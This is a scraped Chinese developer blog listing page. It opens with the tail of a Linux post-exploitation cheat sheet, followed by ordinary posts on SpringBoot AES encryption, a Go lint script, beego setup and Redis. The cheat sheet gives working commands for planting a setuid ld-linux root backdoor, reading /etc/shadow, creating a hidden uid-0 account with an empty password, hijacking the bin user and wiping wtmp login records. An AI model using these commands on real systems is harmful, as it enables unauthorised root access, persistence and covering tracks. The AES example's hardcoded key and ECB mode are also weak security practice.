<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"></span><br><span class="line">ls /lib/ld-linux*</span><br><span class="line"></span><br><span class="line">cp /lib/ld-linux.so.2 /tmp/.str1ven</span><br><span class="line"></span><br><span class="line">ls -l .str1ven</span><br><span class="line"></span><br><span class="line">chmod +s .str1ven</span><br><span class="line"></span><br><span class="line">ls -l .str1ven</span><br></pre></td></tr></table></figure>

<p>-rwsr-sr-x 1 root root 121684 07-08 21:13 .str1ven</p>
<p>成功建立一个后门，退出root，执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./.str1ven `<span class="built_in">which</span> whoami`</span><br></pre></td></tr></table></figure>

<p>又成功获取root权限~~ </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看linux用户</span></span><br><span class="line">cat /etc/passwd </span><br><span class="line"><span class="comment"># 查看用户密码需要root权限</span></span><br><span class="line">cat /etc/shadow </span><br><span class="line"><span class="comment"># N代表网卡号 查看所在网卡的ip信息</span></span><br><span class="line">cat /etc/sysconfig/network-scripts/ifcfg-ethn </span><br><span class="line"><span class="comment"># 查看本机ip信息</span></span><br><span class="line">ifconfig </span><br><span class="line"><span class="comment"># 查看DNS信息</span></span><br><span class="line">cat /etc/resolv.conf </span><br><span class="line">在反弹的shell中使用可以直观显示命令</span><br><span class="line">bash -i</span><br></pre></td></tr></table></figure>

<p><strong>bash prompt:</strong><br>当你以普通限权用户身份进入的时候，一般你会有一个类似bash$的prompt。当你以Root登陆时，你的prompt会变成bash#。</p>
<p><strong>系统变量:</strong><br>试着<code>echo &quot;$USER / $EUID&quot;</code>系统应该会告诉你它认为你是什么用户。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1&gt;/proc/sys/net/ipv4/if_forward,1&gt;/proc/sys/net/ipv4/ip_forward</span><br><span class="line"><span class="comment"># 修改,默认是0,也就是内核不进行数据包过滤,改为1 ,让内核对数据包进行filter处理!</span></span><br><span class="line">vim /proc/sys/net/ipv4/ip_forward </span><br><span class="line"><span class="comment"># 查看80端口的进程</span></span><br><span class="line">netstat -an |grep LISTEN |grep :80 查看端口</span><br><span class="line"><span class="comment"># 服务正在运行的进程</span></span><br><span class="line">service --status-all | grep running</span><br><span class="line"><span class="comment"># 服务为http的进程</span></span><br><span class="line">service --status-all | grep http</span><br><span class="line"><span class="comment"># 查看系统版本</span></span><br><span class="line">lsb_release -a </span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启ssh服务 ：</span></span><br><span class="line">/usr/sbin/sshd stop/</span><br><span class="line">usr/sbin/sshd start</span><br></pre></td></tr></table></figure>

<p>ssd_config文件里</p>
<p><code>PasswordAuthentication no</code></p>
<p>将其改为</p>
<p><code>PasswordAuthentication yes</code></p>
<p>远程ssh才可登录</p>
<p>否则显示<code>Access denied</code></p>
<p>其中Usepam yes可能用来建立pam方式login，比如从其它linux主机ssh到服务端，如果关闭，则不能打开.</p>
<h2 id="su的菜鸟用法"><a href="#su的菜鸟用法" class="headerlink" title="su的菜鸟用法"></a>su的菜鸟用法</h2><p>先</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chomod 777 /etc/passwd</span><br></pre></td></tr></table></figure>

<p>然后修改bin用户的gid和uid为0</p>
<p>然后passwd设置bin的密码</p>
<p>然后</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash /sbin/nologin</span><br></pre></td></tr></table></figure>

<p>然后su的时候</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su - bin</span><br></pre></td></tr></table></figure>

<p>就可以到rootshell了。</p>
<p>这个原理就是当ssh不允许root用ssh终端登陆的时候，我们又不知道root密码的一种很菜鸟的做法。</p>
<p><strong>还可以这样</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sed -i s/bin:x:1:1/bin:x:0:1/g /etc/passwd</span><br><span class="line"></span><br><span class="line">gcc prtcl2.c –o <span class="built_in">local</span> –static –Wall</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"nosec:x:0:0::/:/bin/sh"</span> &gt;&gt; /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"nosec::-1:-1:-1:-1:-1:-1:500"</span> &gt;&gt; /etc/shadow</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空last记录 </span></span><br><span class="line">cp /dev/null /var/<span class="built_in">log</span>/wtmp</span><br></pre></td></tr></table></figure>

<p>建立一个100m的大文件在利用Linux Kernel &lt;= 2.6.17.4 (proc) Local Root Exploit提权的时候要用到的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="keyword">if</span>=/dev/zero of=yourfile bs=10M count=10 </span><br><span class="line"></span><br><span class="line"><span class="comment"># 开22端口</span></span><br><span class="line">/etc/init.d/ssh start   </span><br><span class="line"><span class="comment"># SSH服务配置文件</span></span><br><span class="line">/etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>


          
        
      
    </div>
    
    
    

    <div>
      
    </div>

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://pibigstar.com/2019/03/24/SpringBoot前后端数据传输加密/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="派大星">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/qq.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="派大星的博客">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/24/SpringBoot前后端数据传输加密/" itemprop="url">SpringBoot前后端数据传输加密</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-24T11:11:04+08:00">
                2019-03-24
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Java-springboot-SpringBoot技能大全/" itemprop="url" rel="index">
                    <span itemprop="name">Java,springboot,SpringBoot技能大全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>采用的算法为AES算法</p>
<h1 id="1-编写加密工具类"><a href="#1-编写加密工具类" class="headerlink" title="1. 编写加密工具类"></a>1. 编写加密工具类</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pibigstar.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.KeyGenerator;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 前后端数据传输加密工具类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> pibigstar</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AesEncryptUtils</span> </span>&#123;</span><br><span class="line">	<span class="comment">//可配置到Constant中，并读取配置文件注入</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String KEY = <span class="string">"abcdef0123456789"</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//参数分别代表 算法名称/加密模式/数据填充方式</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String ALGORITHMSTR = <span class="string">"AES/ECB/PKCS5Padding"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 加密</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> content 加密的字符串</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> encryptKey key值</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">encrypt</span><span class="params">(String content, String encryptKey)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		KeyGenerator kgen = KeyGenerator.getInstance(<span class="string">"AES"</span>);</span><br><span class="line">		kgen.init(<span class="number">128</span>);</span><br><span class="line">		Cipher cipher = Cipher.getInstance(ALGORITHMSTR);</span><br><span class="line">		cipher.init(Cipher.ENCRYPT_MODE, <span class="keyword">new</span> SecretKeySpec(encryptKey.getBytes(), <span class="string">"AES"</span>));</span><br><span class="line">		<span class="keyword">byte</span>[] b = cipher.doFinal(content.getBytes(<span class="string">"utf-8"</span>));</span><br><span class="line">		<span class="keyword">return</span> Base64.encodeBase64String(b);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 解密</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> encryptStr 解密的字符串</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> decryptKey 解密的key值</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">decrypt</span><span class="params">(String encryptStr, String decryptKey)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		KeyGenerator kgen = KeyGenerator.getInstance(<span class="string">"AES"</span>);</span><br><span class="line">		kgen.init(<span class="number">128</span>);</span><br><span class="line">		Cipher cipher = Cipher.getInstance(ALGORITHMSTR);</span><br><span class="line">		cipher.init(Cipher.DECRYPT_MODE, <span class="keyword">new</span> SecretKeySpec(decryptKey.getBytes(), <span class="string">"AES"</span>));</span><br><span class="line">		<span class="keyword">byte</span>[] encryptBytes = Base64.decodeBase64(encryptStr);</span><br><span class="line">		<span class="keyword">byte</span>[] decryptBytes = cipher.doFinal(encryptBytes);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> String(decryptBytes);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">encrypt</span><span class="params">(String content)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> encrypt(content, KEY);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">decrypt</span><span class="params">(String encryptStr)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> decrypt(encryptStr, KEY);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		String content = <span class="string">"派大星"</span>;</span><br><span class="line">		System.out.println(<span class="string">"加密前："</span> + content);</span><br><span class="line"></span><br><span class="line">		String encrypt = encrypt(content, KEY);</span><br><span class="line">		System.out.println(<span class="string">"加密后："</span> + encrypt);</span><br><span class="line"></span><br><span class="line">		String decrypt = decrypt(encrypt, KEY);</span><br><span class="line">		System.out.println(<span class="string">"解密后："</span> + decrypt);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="2-前端"><a href="#2-前端" class="headerlink" title="2. 前端"></a>2. 前端</h1><p>js 文件下载：<a href="https://pan.baidu.com/s/11LnXUnsMtGW5C8sycf2SDQ" target="_blank" rel="noopener">https://pan.baidu.com/s/11LnXUnsMtGW5C8sycf2SDQ</a></p>
<p>导入 js 文件</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span> = <span class="string">"js/aes.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span> = <span class="string">"js/pad-zeropadding.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span> = <span class="string">"js/security.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>发送数据</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendData</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		alert(<span class="string">"发送的数据："</span>+Encrypt(<span class="built_in">JSON</span>.stringify(&#123;<span class="attr">name</span>:<span class="string">"派大星"</span>&#125;)));</span><br><span class="line">		$.ajax(&#123;</span><br><span class="line">	        type: <span class="string">"POST"</span>,</span><br><span class="line">	        url:<span class="string">"/save"</span>,</span><br><span class="line">	        data:Encrypt(<span class="built_in">JSON</span>.stringify(&#123;<span class="attr">name</span>:<span class="string">"派大星"</span>&#125;)),</span><br><span class="line">	        dataType:<span class="string">'json'</span>,</span><br><span class="line">	        contentType: <span class="string">"application/json"</span>,</span><br><span class="line">	        success: <span class="function"><span class="keyword">function</span>(<span class="params">resData</span>) </span>&#123;</span><br><span class="line">	        	alert(<span class="string">"返回的数据："</span>+resData);</span><br><span class="line">	        	alert(<span class="string">"解密之后："</span>+Decrypt(resData));</span><br><span class="line">	        	alert(<span class="string">"解密之后转json对象："</span>+<span class="built_in">JSON</span>.parse(Decrypt(resData)).name);</span><br><span class="line">	        &#125;</span><br><span class="line">		&#125;); </span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>


          
        
      
    </div>
    
    
    

    <div>
      
    </div>

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://pibigstar.com/2019/03/24/Go代码风格检查脚本/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="派大星">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/qq.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="派大星的博客">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/24/Go代码风格检查脚本/" itemprop="url">Go代码风格检查脚本</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-24T11:11:04+08:00">
                2019-03-24
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/go/" itemprop="url" rel="index">
                    <span itemprop="name">go</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Go代码风格检查脚本"><a href="#Go代码风格检查脚本" class="headerlink" title="Go代码风格检查脚本"></a>Go代码风格检查脚本</h1><p>check.sh</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$&#123;GOPATH&#125;</span>/src/github.com/pibigstar/go-demo"</span></span><br><span class="line"><span class="comment"># 判断是否有环形导入</span></span><br><span class="line">gocyclo -over 25 $(ls -d */ | grep -v vendor | grep -v proto)</span><br><span class="line"><span class="comment"># 查找是否有错误</span></span><br><span class="line">find . -<span class="built_in">type</span> f -not -path <span class="string">"./vendor/*"</span> | xargs -0 misspell -error</span><br><span class="line"><span class="comment"># 对所有代码进行格式化</span></span><br><span class="line">find . -name <span class="string">"*.go"</span> -not -path <span class="string">"./vendor/*"</span>  | xargs gofmt -w</span><br><span class="line"><span class="comment"># 对所有代码进行导入格式化</span></span><br><span class="line">find . -name <span class="string">"*.go"</span> -not -path <span class="string">"./vendor/*"</span>  | xargs goimports -w</span><br><span class="line"><span class="comment"># 判断前后两次是否有差别，如果有则退出</span></span><br><span class="line">git diff --<span class="built_in">exit</span>-code</span><br></pre></td></tr></table></figure>


          
        
      
    </div>
    
    
    

    <div>
      
    </div>

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://pibigstar.com/2019/03/21/Go语言入门（3）beego的安装与使用/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="派大星">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/qq.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="派大星的博客">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/21/Go语言入门（3）beego的安装与使用/" itemprop="url">Go语言入门（3）beego的安装与使用</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-21T13:01:04+08:00">
                2019-03-21
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/go/" itemprop="url" rel="index">
                    <span itemprop="name">go</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="1-安装库"><a href="#1-安装库" class="headerlink" title="1. 安装库"></a>1. 安装库</h1><p>可参考 ：<a href="https://beego.me/quickstart" target="_blank" rel="noopener">https://beego.me/quickstart</a></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> get -u github.com/astaxie/beego</span><br></pre></td></tr></table></figure>

<p>再安装bee</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> get -u github.com/beego/bee</span><br></pre></td></tr></table></figure>

<h1 id="2-配置bee的环境变量"><a href="#2-配置bee的环境变量" class="headerlink" title="2. 配置bee的环境变量"></a>2. 配置bee的环境变量</h1><p>在环境变量 path 中新加入 一个 %GOPATH%/bin</p>
<h1 id="3-测试"><a href="#3-测试" class="headerlink" title="3. 测试"></a>3. 测试</h1><p>在cmd 命令窗口中输入 ： bee 即可</p>
<h1 id="4-使用"><a href="#4-使用" class="headerlink" title="4. 使用"></a>4. 使用</h1><h2 id="4-1-新建一个beego项目"><a href="#4-1-新建一个beego项目" class="headerlink" title="4.1 新建一个beego项目"></a>4.1 新建一个beego项目</h2><p>在cmd 命令行窗口中输入：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bee <span class="built_in">new</span> myfirst</span><br></pre></td></tr></table></figure>

<h2 id="4-2-运行"><a href="#4-2-运行" class="headerlink" title="4.2 运行"></a>4.2 运行</h2><p>先进入你生成的 项目中：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> myfirst</span><br></pre></td></tr></table></figure>

<p>运行</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bee run</span><br></pre></td></tr></table></figure>

<p>如果没报错，并且浏览器访问 <a href="http://127.0.0.1:8080" target="_blank" rel="noopener">http://127.0.0.1:8080</a> 出现欢迎页面则证明一切OK</p>

          
        
      
    </div>
    
    
    

    <div>
      
    </div>

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://pibigstar.com/2019/03/21/SpringBoot使用redis/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="派大星">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/qq.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="派大星的博客">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/21/SpringBoot使用redis/" itemprop="url">SpringBoot使用redis</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-21T13:01:04+08:00">
                2019-03-21
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Java-springboot-redis-SpringBoot技能大全/" itemprop="url" rel="index">
                    <span itemprop="name">Java,springboot,redis,SpringBoot技能大全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>[TOC]</p>
<h1 id="1-下载redis和工具"><a href="#1-下载redis和工具" class="headerlink" title="1. 下载redis和工具"></a>1. 下载redis和工具</h1><ol>
<li>redis服务器下载： <a href="https://pan.baidu.com/s/1bJTb1G-JwuqBpSwj-e-pxA" target="_blank" rel="noopener">点击这里</a></li>
<li>解压，双击start.bat启动服务</li>
<li>下载redis桌面管理程序：<a href="https://github.com/uglide/RedisDesktopManager/releases/download/0.9.3/redis-desktop-manager-0.9.3.817.exe" target="_blank" rel="noopener">点击这里</a></li>
<li>安装即可</li>
</ol>
<h1 id="2-加载redis的jar包"><a href="#2-加载redis的jar包" class="headerlink" title="2. 加载redis的jar包"></a>2. 加载redis的jar包</h1><p>在SpringBoot的pom.xml文件中加入下列内容</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="3-添加配置文件"><a href="#3-添加配置文件" class="headerlink" title="3. 添加配置文件"></a>3. 添加配置文件</h1><p>在application.yml文件中加入下列内容</p>
